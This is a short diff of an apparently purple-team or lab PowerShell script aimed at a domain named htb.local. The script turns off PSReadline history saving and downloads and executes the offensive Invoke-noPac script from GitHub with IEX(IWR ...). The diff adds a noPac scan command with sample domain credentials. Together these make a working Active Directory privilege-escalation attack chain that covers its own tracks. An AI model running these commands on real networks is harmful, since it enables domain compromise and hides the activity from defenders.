@@ -11,3 +11,5 @@ Set-PSReadlineOption -HistorySaveStyle SaveNothing
 IEX(IWR -UseBasicParsing -UserAgent "hi-there-purple-team" 'https://raw.githubusercontent.com/ricardojba/Invoke-noPac/main/Invoke-noPac.ps1')
 
 Invoke-noPac
+
+Invoke-noPac -Command "scan -domain htb.local -user domain_user -pass 'Password123!'"
